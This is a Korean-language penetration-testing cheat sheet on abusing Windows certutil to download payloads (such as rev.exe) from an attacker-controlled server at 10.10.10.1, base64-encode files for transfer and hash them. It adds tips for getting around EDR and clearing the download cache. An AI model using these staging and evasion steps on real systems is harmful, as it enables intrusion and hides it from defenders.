# certutil로 파일 전송·인코딩

- certutil — Windows에 내장된 인증서 관리 도구. 인증서 목적 외에 URL 다운로드(-urlcache), base64 인코딩/디코딩, 파일 해시 계산에도 쓰이는 대표적인 LOLBin이다.
- 피해 호스트에서 아웃바운드 HTTP가 열려 있고 PowerShell 사용이 어려울 때 대체 다운로드 수단으로 쓴다. 파일을 base64로 옮기거나 무결성 검증용 해시를 뽑을 때도 쓴다.
- Windows cmd 셸이면 충분하다(내장 명령). 일반 사용자 권한으로 실행 가능하고, 다운로드 대상 URL에 접근 가능해야 한다.

## 파일 다운로드

```cmd
certutil -urlcache -split -f http://10.10.10.1:8000/rev.exe C:\Windows\Temp\rev.exe
certutil -urlcache -split -f http://10.10.10.1:8000/rev.exe rev.exe
```

- `-urlcache`: URL 캐시 기능으로 파일을 내려받는다. `-split`: 내장 인코딩을 분해하는 옵션으로, 없으면 캐시 메타데이터가 섞인 파일이 저장된다.
- `-f`: 강제(force) 다운로드. 출력 경로를 생략하면 현재 디렉터리에 저장된다.

## base64 인코딩·디코딩

```cmd
certutil -encode payload.exe payload.b64
certutil -decode payload.b64 payload.exe
certutil -decodehex hex.txt out.bin
```

- 인코딩 결과에 BEGIN/END 헤더가 붙지만, decode는 헤더가 있어도 없어도 정상 동작한다.
- 전송 제한이 있는 채널(원격 데스크톱 클립보드, 콘솔 붙여넣기)로 파일을 옮길 때 encode/decode 쌍을 쓴다.

## 해시 계산

```cmd
certutil -hashfile C:\Windows\Temp\rev.exe MD5
certutil -hashfile C:\Windows\Temp\rev.exe SHA256
```

- 공격자 쪽 파일과 해시를 비교해 전송 무결성을 확인한다.

## 실전 예시

```cmd
:: 다운로드 -> 해시 확인 -> base64로 다른 호스트에 옮기기
certutil -urlcache -split -f http://10.10.10.1:8000/tool.exe tool.exe
certutil -hashfile tool.exe SHA256
certutil -encode tool.exe tool.b64
certutil -decode tool.b64 tool.exe
```

## 팁·트러블슈팅

1. certutil 다운로드는 EDR에 잘 잡힌다(대표 LOLBin 감시 대상). 차단되면 curl.exe(Windows 10 이상 내장), iwr(Invoke-WebRequest), BITS로 전환한다.
2. `-urlcache`는 내려받은 파일을 URL 캐시에 남긴다. `certutil -urlcache * delete`로 캐시 항목을 정리할 수 있다.
3. HTTP 파일서버가 NTLM 인증을 요구하면 certutil이 익명으로 시도해 실패할 수 있다. AD 내부라면 자격을 따르는 SMB 복사(copy \\server\share\file)로 전환한다.
4. UNC 경로는 -urlcache가 지원하지 않는다. 네트워크 공유에서는 copy 명령을 쓴다.
